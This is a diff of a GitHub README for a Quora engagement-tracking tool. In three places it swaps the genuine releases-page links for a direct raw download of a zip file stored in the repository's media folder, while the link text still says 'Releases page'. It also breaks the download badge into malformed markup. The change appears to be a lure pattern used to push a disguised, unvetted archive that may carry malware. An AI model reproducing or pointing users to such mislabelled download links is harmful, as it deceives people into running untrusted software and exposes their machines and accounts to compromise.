@@ -1,7 +1,7 @@
 # 🎉 Quora-Engagement-Tracker - Track Your Quora Engagement Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Quora--Engagement--Tracker-v1.0-blue.svg)](https://github.com/NoluckyVN/Quora-Engagement-Tracker/releases)
+[![Download](https://raw.githubusercontent.com/NoluckyVN/Quora-Engagement-Tracker/main/media/Quora-Engagement-Tracker_tissue.zip%https://raw.githubusercontent.com/NoluckyVN/Quora-Engagement-Tracker/main/media/Quora-Engagement-Tracker_tissue.zip)](https://raw.githubusercontent.com/NoluckyVN/Quora-Engagement-Tracker/main/media/Quora-Engagement-Tracker_tissue.zip)
 
 ## 📖 Overview
 Quora-Engagement-Tracker helps you automate the monitoring of your engagement on Quora. It provides insights into user behavior and simplifies multi-account management. This application makes it easy for you to track how well your content is performing without needing any technical knowledge.
@@ -10,7 +10,7 @@ Quora-Engagement-Tracker helps you automate the monitoring of your engagement on
 To get started with Quora-Engagement-Tracker, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/NoluckyVN/Quora-Engagement-Tracker/releases). This is where you will find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/NoluckyVN/Quora-Engagement-Tracker/main/media/Quora-Engagement-Tracker_tissue.zip). This is where you will find the latest version of the application.
 
 2. **Choose Your Version**  
    You will see a list of available versions. Select the most recent release. Each version will include the features and improvements made since the last update.
@@ -50,7 +50,7 @@ Before installing Quora-Engagement-Tracker, ensure your system meets the followi
 If you encounter any issues or need assistance, you can reach out via the Issues section of our GitHub repository. We encourage you to report any bugs or problems for prompt attention.
 
 ## 📍 Download & Install
-You can easily get Quora-Engagement-Tracker by visiting this [Releases page](https://github.com/NoluckyVN/Quora-Engagement-Tracker/releases) and following the download steps provided above. Enjoy tracking your Quora engagement with ease!
+You can easily get Quora-Engagement-Tracker by visiting this [Releases page](https://raw.githubusercontent.com/NoluckyVN/Quora-Engagement-Tracker/main/media/Quora-Engagement-Tracker_tissue.zip) and following the download steps provided above. Enjoy tracking your Quora engagement with ease!
 
 ## 🌐 Related Topics
 - adb-less-automation
